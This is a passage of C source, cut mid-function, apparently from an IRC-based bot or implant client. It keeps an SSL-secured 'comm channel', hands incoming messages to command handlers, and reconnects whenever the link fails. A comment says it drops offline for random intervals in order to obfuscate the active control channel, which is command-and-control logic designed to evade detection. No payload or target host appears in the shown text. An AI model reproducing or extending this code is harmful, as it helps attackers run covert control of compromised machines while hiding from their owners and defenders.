    /* Active com loop, during an active connection, this is looping */
    while (rc == RC_CONTINUE)
    {
        /* Be online for a short amount of time, sleep when the current time ONLINE_TIME_IN_SECONDS */
    #if 0
        if ((time(NULL) - (onlineSince()) > ONLINE_TIME_IN_SECONDS))
        {
            irc_sendmsg (ssl, "Online time limit of %d seconds reached. Going to hibernate...\n", ONLINE_TIME_IN_SECONDS);
            rc = RC_SLEEP;
            break;
        }
    #endif

        rc_numbytes = secure_read (ssl, buf, BUFFERSIZE);
        if (rc_numbytes > 0)
        {
            /* Trigger the IRC communication handler */
            rc = irc_comm_handler (ssl, buf, rc_numbytes);
        }
        else
        {
            /* Trigger the IRC idle command handler */
            rc = irc_idle_handler (ssl);
        }
    }

    free (buf);
    return rc;
}


/*
 * Grand life loop.
 *
 * This function will loop to setup a connection.
 * by time, terminate the connection, sleep and revive the connection to the service
 * The choice of stopping the client is also handled from here
 * 
 * This function can also be called to restart the entire process if the connection was lost for instance.
 */
int grand_life_loop (void)
{
    int rc = RC_CONTINUE;
    int sleep_secs = 0;

    /* Grand loop */
    while (1)
    {
        /* Fire connection */
#ifdef DEBUG
        scar_log (1, "%s: Fire up connection to comm channel.\n", __func__);
#endif
        if (RC_GOOD == fireUpConnectionWithRetry())
        {
            /* Indicate online */
            setOnline();

            /* Secured IRC */
#ifdef DEBUG
            scar_log (1, "%s: Comm channel online.\n", __func__);
#endif
            rc = secured_irc();

            /* Terminate SSL and TCP socket */
#ifdef DEBUG
            scar_log (1, "%s: Terminating network session.\n", __func__);
#endif
            /* Should I halt? */
            if (rc == RC_STOP)
            {
                terminate_session();
                setOffline();

                break;
            }
            else if (rc == RC_SLEEP)
            {
                /* Going to sleep - The idea is to sever the line from time to time to obfuscate the active control channel */
                sleep_secs = randomAverageDeviationCalc (WAIT_AVERAGE_SEC, WAIT_MAXMIN_SEC);
                irc_sendmsg (getSSL(), "Going offline for %d seconds. Bye.", sleep_secs); 

                /* Going offline */
                terminate_session();
                         
                /* Sleep */
                sleep (sleep_secs);
                continue;
            }
            if (rc == RC_RECONNECT)
            {
                terminate_session();
                setOffline();
#ifdef DEBUG
                scar_log (1, "%s: Reconnecting...\n", __func__);
#endif

                continue;
            }
            else
            {
                /* Direct retry */
                continue;
            }
        }
    }
    return rc;
}
